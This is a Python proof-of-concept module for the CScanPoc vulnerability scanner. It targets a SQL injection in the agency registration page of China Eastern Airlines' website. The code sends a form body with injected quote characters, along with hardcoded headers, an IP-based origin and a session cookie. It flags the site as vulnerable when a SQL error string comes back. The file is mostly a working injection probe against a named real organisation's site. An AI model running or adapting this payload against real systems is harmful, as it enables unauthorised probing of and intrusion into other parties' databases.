# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ceairgroup_0101'  # 平台漏洞编号
    name = '航空股份网站SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-21'  # 漏洞公布时间
    desc = '''
    航空股份网站SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=206015
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ceairgroup(东方航空)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '434097b7-46bb-47d8-9175-88e5c26fb7e4'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/ceagent/front/regist/agency-regist!doApplyAgency.shtml"
            payload = '''agency.nameCn=basdfddddsfasdddfDDD aasdfsdddf'"&agency.companyType=&agency.registeredCapital=&agency.empNum=1234&province=%E6%B2%B3%E5%8D%97%E7%9C%81&city=%E8%AF%B7%E9%80%89%E6%8B%A9&secondGrade=%E8%AF%B7%E9%80%89%E6%8B%A9&agency.address=asdfadsf&agency.contact=%E5%A4%A7%E5%90%8D&agency.contactIdno=&agency.contactMobile=15388887777&agency.contactPhone=01923848&agency.contactFax=&agency.contactEmail=test%40qq.com&agency.contactQq=&agency.contactMsn=&deptId=1273831&agency.qualification=21&agency.iatano=123444&agency.officeCode='aaaaaaaaaa&agency.certificatePic=&agency.licensePic=%2Fopt%2Fappdata%2Ffile%2Fceagent%2Ffront%2Fagency%2Flicense_20160507125317.png&agency.contactIdPic=&agency.legalPersonID=%2Fopt%2Fappdata%2Ffile%2Fceagent%2Ffront%2Fagency%2FlegalPersonID_20160507125317.png&agency.taxFile=%2Fopt%2Fappdata%2Ffile%2Fceagent%2Ffront%2Fagency%2FtaxFile_20160507125317.png&agency.airQualificationFile=%2Fopt%2Fappdata%2Ffile%2Fceagent%2Ffront%2Fagency%2FqualificationFile_20160507125317.png'''
            headers = {
                "Content-Length": "1004",
                "Cache-Control": "max-age=0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Origin": "http://122.119.74.149",
                "Upgrade-Insecure-Requests": '1',
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2",
                "Cookie": "Webtrends=42.81.64.69.1462595850175363; JSESSIONID=000090KZ21YUwCs4Kd_XrEFm_Vc:17oarlbrj; Hm_lvt_d86a851fdb4ea57189149064d11606d4=1462596028; Hm_lpvt_d86a851fdb4ea57189149064d11606d4=1462596810",
                "AlexaToolbar-ALX_NS_PH": "AlexaToolbar/alx-4.0"
            }
            _response = requests.post(url, data=payload, headers=headers)
            if "expecting" in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
